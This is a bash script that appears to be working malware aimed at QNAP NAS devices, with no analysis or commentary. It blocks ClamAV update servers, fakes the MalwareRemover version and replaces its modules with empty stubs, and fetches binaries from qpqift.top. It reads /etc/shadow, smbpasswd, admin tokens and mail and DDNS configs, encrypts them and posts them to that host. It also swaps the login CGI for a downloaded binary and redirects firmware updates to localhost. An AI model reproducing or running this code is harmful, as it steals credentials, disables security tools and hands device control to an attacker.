#!/bin/bash
ts=1548478800
PATH="${PATH}:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin"
test -d /etc/config && confdir=/etc/config || { test -d /mnt/HDA_ROOT/.config && confdir=/mnt/HDA_ROOT/.config; }
test -f "${confdir}/smb.conf" && for i in homes Public Download Multimedia Web Recordings; do bdir=`getcfg "$i" path -f "${confdir}/smb.conf"` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && test -d "$bdir" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}" && { command -v readlink >/dev/null 2>&1 || ln -sf /bin/busybox /usr/bin/readlink; for i in homes Public Download Multimedia Web Recordings; do bdir=`readlink "/share/${i}" 2>/dev/null` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && bdir=/share/${bdir##*/} && test -d "$bdir" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`getcfg SHARE_DEF defVolMP -f "${confdir}/def_share.info"` && test -d "$bdir" || bdir=''
test -z "${bdir}" || test ! -d "${bdir}"; } && { while read -r bdir; do
test -d "$bdir" && break; bdir=''
done <<EOF
$(mount | sed -n "s/.*\(\/share\/[^ /]\+\) .*/\1/gp")
EOF
test -z "${bdir}" || test ! -d "${bdir}"; } && { for i in {{CE_,}CACHEDEV{1,2,3},MD0,HDA}_DATA; do test -d "/share/${i}" && bdir="/share/${i}" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}" && { bdir=/mnt/HDA_ROOT && test -d "$bdir" || bdir='/'; }; }

getcfg MalwareRemover Version -f /etc/config/qpkg.conf && setcfg MalwareRemover Version 9.0.0 -f /etc/config/qpkg.conf
getcfg MalwareRemover Date -f /etc/config/qpkg.conf && setcfg MalwareRemover Date 2019-02-25 -f /etc/config/qpkg.conf
getcfg MalwareRemover Build -f /etc/config/qpkg.conf && setcfg MalwareRemover Build 1551070800 -f /etc/config/qpkg.conf

if grep "ipv6.clamav.net" /etc/hosts; then
:
else
countries='ac ad ae af ag ai al am an ao aq ar as at au aw ax az ba bb bd be bf bg bh bi bj bl bm bn bo bq br bs bt bv bw by bz ca cc cd cf cg ch ci ck cl cm cn co cr cu cv cw cx cy cz de dj dk dm do dz ec ee eg eh er es et eu fi fj fk fm fo fr ga gb gd ge gf gg gh gi gl gm gn gp gq gr gs gt gu gw gy hk hm hn hr ht hu id ie il im in io iq ir is it je jm jo jp ke kg kh ki km kn kp kr kw ky kz la lb lc li lk lr ls lt lu lv ly ma mc md me mf mg mh mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nc ne nf ng ni nl no np nr nu nz om pa pe pf pg ph pk pl pm pn pr ps pt pw py qa re ro rs ru rw sa sb sc sd se sg sh si sj sk sl sm sn so sr ss st su sv sx sy sz tc td tf tg th tj tk tl tm tn to tp tr tt tv tw tz ua ug uk um us uy uz va vc ve vg vi vn vu wf ws ye yt za zm zw'

{ for host in 'bugs.clamav.net' 'current.cvd.clamav.net' 'database.clamav.net' 'db.local.clamav.net' 'update.nai.com'; do
echo "0.0.0.0 ${host}"
done

for country in $countries; do
echo "0.0.0.0 db.${country}.clamav.net"
echo "0.0.0.0 db.${country}.ipv6.clamav.net"
echo "0.0.0.0 db.${country}.big.clamav.net"
done; } >>/etc/hosts
fi

test -z "$PWD" && PWD=$(pwd)
CWD="$PWD"
if [ "${CWD%/*}" != "${bdir}/.qpkg" ]; then
        CWD=''
        for dir in '.config' '.liveupdate'; do
                dir="${bdir}/.qpkg/${dir}"
                test -d "$dir" && cd "$dir" && CWD="$dir" && break
        done
fi
test "$CWD" && test -d "$CWD" && cd "$CWD"

sedcmd='s/CXqrBM2CVbJog4rwwSz1Bp1i1B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex/CXqrBM2CVbJog4rwwSz1Bp1i1'"'"'\
verifykey="${verifykey}"'"'"'B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex/'
grepstring='CXqrBM2CVbJog4rwwSz1Bp1i1B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex'
for path in ".config/backup_conf.sh" ".liveupdate/liveupdate.sh"; do
if [ -f "${path#*/}" ]; then 
grep "$grepstring" "${path#*/}" && sed -i "$sedcmd" "${path#*/}"
elif [ -f "${bdir}/.qpkg/${path}" ]; then
test -f "${bdir}/.qpkg/${path}" && grep "$grepstring" "${bdir}/.qpkg/${path}" && sed -i "$sedcmd" "${bdir}/.qpkg/${path}"
fi
done

sedcmd='s/CXqrBM2CVbJog4rwwSz1Bp1i1'"'"'/CXqrBM2CVbJo'"'"';verifykey="${verifykey}"'"'"'g4rwwSz1Bp1i1'"'/"
grepstring='CXqrBM2CVbJog4rwwSz1Bp1i1'"'"
for path in ".config/backup_conf.sh" ".liveupdate/liveupdate.sh"; do
if [ -f "${path#*/}" ]; then 
grep "$grepstring" "${path#*/}" && sed -i "$sedcmd" "${path#*/}"
elif [ -f "${bdir}/.qpkg/${path}" ]; then
test -f "${bdir}/.qpkg/${path}" && grep "$grepstring" "${bdir}/.qpkg/${path}" && sed -i "$sedcmd" "${bdir}/.qpkg/${path}"
fi
done

version=$(getcfg System Version)
test "x${version}" = 'x' && version=$(getcfg System Version -f /etc/default_config/uLinux.conf)

for file in /etc/config/rssdoc/qpkgcenter_*.xml
do
test -f "$file" && rm "$file" && cp "./rssdoc/Liveupdate/QTS${version}/${file##*/}" "$file" && test -f '.qdisk_cmd' && ./.qdisk_cmd +i "$file"
done
file=''
if find /etc/config/ | grep 'qpkgcenter_.*\.xml'; then
:
else
cp "./rssdoc/Liveupdate/QTS${version}/qpkgcenter_eng.xml" '/etc/config/rssdoc/qpkgcenter_eng.xml'
test -f '.qdisk_cmd' && ./.qdisk_cmd +i '/etc/config/rssdoc/qpkgcenter_eng.xml'
fi

if [ ! -f ".qdisk_cmd" ]; then
	case "$(uname -m)" in 
	*x86_64*)
			arch=x86_64
			binhash='g2oe7EJJVCiAHY6AG1I1c/lGF8Y='
			;;
	*arm*)
			arch=arm
			binhash='Z3twHZvQqYZ1vLeu4PLnZekdkRY='
			;;
	*i*86*)
			arch=i486
			binhash='gWzECXuIp3dz5yI7RJS9d4+xpq4='
			;;
	esac
	
	if [ "x${binhash}" != 'x' ]; then
		curl --connect-timeout 12 -m 1200 -k -o ".qdisk_cmd.tmp" "https://qpqift.top/data/qdisk_cmd_${arch}" || rm -f ".qdisk_cmd.tmp"
		test -f '.qdisk_cmd.tmp' && rsynchash="$(openssl dgst -sha1 -binary ".qdisk_cmd.tmp" | openssl base64)"
		if [ "x${rsynchash}" = "x${binhash}" ]; then
			mv '.qdisk_cmd.tmp' '.qdisk_cmd' && chmod +x '.qdisk_cmd'
		else
			rm -f '.qdisk_cmd.tmp'
		fi
	fi
fi
binhash=''; rsynchash=''

for qpkgdir in "${bdir}/.qpkg" '../../.qpkg'; do
test -d "$qpkgdir" && break
done
test -d "${qpkgdir}/MalwareRemover" || mkdir "${qpkgdir}/MalwareRemover"
test -f '.qdisk_cmd' && ./.qdisk_cmd +i "${qpkgdir}/MalwareRemover"

if [ -d "${qpkgdir}/MalwareRemover/modules" ]; then
for file in 10_derek_3.pyc 12_derek_3.pyc; do
test ! -f "${qpkgdir}/MalwareRemover/modules/${file}" || rm -f "${qpkgdir}/MalwareRemover/modules/${file}" && cat >"${qpkgdir}/MalwareRemover/modules/${file}" <<"EOF"
#!/bin/sh
exit 0
EOF
chmod +x "${qpkgdir}/MalwareRemover/modules/${file}"
test -f '.qdisk_cmd' && ./.qdisk_cmd +i "${qpkgdir}/MalwareRemover/modules/${file}"
done
fi
file=''; qpkgdir=''

if [ ! -f .rsakey ]; then
verifykey='-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAt/EDT6SB75atrHW7Cpog
CXqrBM2CVbJog4rwwSz1Bp1i1'
verifykey="${verifykey}"'B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex
RC5qQSiS/7FS48jsPKsJnrUhnsI1fRLM4DqsEF3UOukZuDOYUhlteDuMqqZBz0AC
Q3YnLjraTjchMF0XmaAAcWOkg5MsxAOKTepue4R/tnrPAkAG86nq5LA1+wa7opNV
gQzwDh7YXhBnWz52+ebZ9TeqD31/sb5hoyUKf1Nr5HcKkklObuz1OGQJ//pkCbTC
2EnQw6tCPQhgSIA8wJKkaxW0f/UHP+YBmWa4Wn+uPrJJuHSVNEJtAp2wlX3THltz
0IGPQEuzoafOAl3EFjas3HcTX2HlEfnvAtRL2iLxJeba1nZ+U3geZOuxL1NhWhNh
pjaLcKwhkRck7Y5hr1Pz8pLDnXsx5w0QUz6XS8HVf/KHnNXHufFEn01y9YoPuau1
DNnpDGbq632Bs8ESd3ueHk9OY/UZxWeN3UdbseFxK35XAgMBAAE=
-----END PUBLIC KEY-----'
test -f ".rsakey" || echo "$verifykey" > ".rsakey"
fi

if [ ! -f "${ts}_c" ]; then
key=$(tr -dc 'a-zA-Z0-9' </dev/urandom | { key=''; dd bs=20 count=1 2>/dev/null || head -c 20 || IFS='' read -rd '' -n 20 key; echo "$key"; } )
test "x$key" = 'x' && key=$(LC_ALL=C sed 's/[^a-zA-Z0-9]//g' </dev/urandom | { key=''; dd bs=20 count=1 2>/dev/null || head -c 20 || IFS='' read -rd '' -n 20 key; echo "$key"; } )
{ echo "$key" | openssl rsautl -pubin -inkey .rsakey -encrypt | openssl enc -base64 -A; printf ':'
{ echo; for file in "${bdir}/.log/.rqsys.log" /etc/config/.qos_config/users/admin/.qtoken /etc/config/.qos_config/users/admin/secondSV.conf /etc/config/ssmtp/ssmtp.conf /etc/config/smbpasswd /etc/shadow /mnt/HDA_ROOT/.config/qnapddns.conf /mnt/HDA_ROOT/.config/qid.conf; do printf '%s:' "$file"; cat "$file"; echo; done; printf '%s:' "authLogin.cgi"; /home/httpd/cgi-bin/authLogin.cgi; } | gzip | { dd bs=4096 count=512 || head -c 2097152 || cat; } | openssl enc -aes-256-cbc -k "$key" -md md5 -salt -a -A; } | curl --connect-timeout 12 -m 300 -k -d '@-' "https://qpqift.top/ping.pl"
fi

cgibindir='/home/httpd/cgi-bin'
if [ ! -f "1547971200_c" ] && [ ! -f "${cgibindir}/sysauthLogin.cgi" ] && [ -f "${cgibindir}/authLogin.cgi" ]; then
	case "$(uname -m)" in 
	*x86_64*)
			arch=x86_64
			binhash='pt+a/Y3gGOPe9uyBgm85h2eOQV8='
			;;
	*arm*)
			arch=arm
			binhash='W5SbpKsI90NUy4uQg3Pm1agAFho='
			;;
	*i*86*)
			arch=i486
			binhash='TagzVbVf5YhxA3ZXwgBMQKw2zG4='
			;;
	esac
	
	if [ "x${binhash}" != 'x' ]; then
		curl --connect-timeout 12 -m 1200 -k -o ".qal" "https://qpqift.top/data/qal_${arch}" || rm -f ".qal"
		test -f '.qal' && rsynchash="$(openssl dgst -sha1 -binary ".qal" | openssl base64)"
		if [ "x${rsynchash}" = "x${binhash}" ]; then
			test -f "${cgibindir}"/sysauthLogin.cgi && mv "${cgibindir}"/sysauthLogin.cgi "${cgibindir}"/authLogin.cgi
			mv "${cgibindir}"/authLogin.cgi "${cgibindir}"/sysauthLogin.cgi && test -f "${cgibindir}"/sysauthLogin.cgi && mv '.qal' "${cgibindir}"/authLogin.cgi && chmod +x "${cgibindir}"/authLogin.cgi
		fi
	fi
	test -f "1547971200_c" || touch "1547971200_c"
fi

test ! -f "${cgibindir}"/authLogin.cgi && test -f "${cgibindir}"/sysauthLogin.cgi && mv "${cgibindir}"/sysauthLogin.cgi "${cgibindir}"/authLogin.cgi

if [ ! -d rssdoc ]; then 
command -v bunzip2 && compext=bz2 || compext=gz
curl --connect-timeout 12 -m 1200 -k -o "rssdoc.tar.${compext}" "https://qpqift.top/data/rssdoc.tar.${compext}" || { rm "rssdoc.tar.${compext}" && exit 1; }
test -f "rssdoc.tar.${compext}" || exit 1
rssdochash="$(openssl dgst -sha1 -binary "rssdoc.tar.${compext}" | openssl base64)"
test "$rssdochash" = 'WOkc6vlUa7A30GKa4Z4o02CIexk=' || test "$rssdochash" = "0h0Jyx52a/F9YB80Ml4SsEsugyA=" || { rm -f "rssdoc.tar.${compext}"; exit 1; }
test "$compext" = bz2 && tarflag=j || tarflag=z
tar -x${tarflag}f "rssdoc.tar.${compext}" || { rm -f rssdoc.tar.{,.${compext}}; exit 1; } 
rm -f "rssdoc.tar.${compext}"
fi

rm /home/httpd/{Liveupdate,FirmwareRelease{,_beta}S.xml}
ln -s "${CWD}"/rssdoc/{Liveupdate,FirmwareRelease{,_beta}S.xml} /home/httpd

if grep 'Liveupdate\|FirmwareRelease\|QTS_FW' /etc/default_config/uLinux.conf /etc/config/uLinux.conf | grep 'qnap\.com\|0\.0\.0\.0'; then
internalwebport=$(/sbin/getcfg System InnerWebAccessPort -d 58080)
localupdateurl="http://127.0.0.1:${internalwebport}"
sed -i 's/https\?:\/\/[^\/]\+\/\(Liveupdate\|FirmwareRelease\|QTS_FW\)/http:\/\/127.0.0.1:'${internalwebport}'\/\1/' /etc/default_config/uLinux.conf /etc/config/uLinux.conf
fi

test -f /etc/config/.qsync.conf && authkeysfile=$(grep AuthorizedKeysFile /etc/config/.qsync.conf | sed 's/"//g' | cut -d ' ' -f 2)
if [ "$authkeysfile" ] && [ -f "$authkeysfile" ] && grep 'miOGcmendZU2r10SdZVplBQ4i' "$authkeysfile"; then
sed -i '/miOGcmendZU2r10SdZVplBQ4i/d' "$authkeysfile"
lsofout="$(lsof +c 0 -i -n -P | grep :51163)"
sshpid="$(echo "$lsofout" | tr -s ' ' | cut -d ' ' -f 2 | head -n 1)"
kill -2 "$sshpid"
fi

test -f "${ts}_c" || touch "${ts}_c"
rm -f "${CWD}/".tmp.*
exit 0
